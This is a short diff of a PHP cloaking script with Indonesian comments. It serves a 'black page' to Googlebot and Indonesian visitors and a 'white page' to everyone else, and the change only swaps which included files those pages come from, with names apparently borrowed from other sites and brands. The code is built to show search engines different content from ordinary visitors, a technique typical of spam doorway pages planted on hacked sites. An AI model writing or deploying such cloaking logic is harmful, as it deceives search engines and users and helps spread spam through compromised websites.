@@ -29,11 +29,11 @@ $isIndonesia = isIndonesia($remoteIp);
 
 // Googlebot atau visitor Indonesia → page hitam
 if ($isGoogleBot || $isIndonesia) {
-    include __DIR__ . '/coachingparaempezar.html';
+    include __DIR__ . '/scoopbiz.html';
     exit;
 }
 
 // Luar Indonesia → page putih
-include __DIR__ . '/cursos.txt';  
+include __DIR__ . '/ihg-hotels-resorts.txt';  
 exit;
 ?>
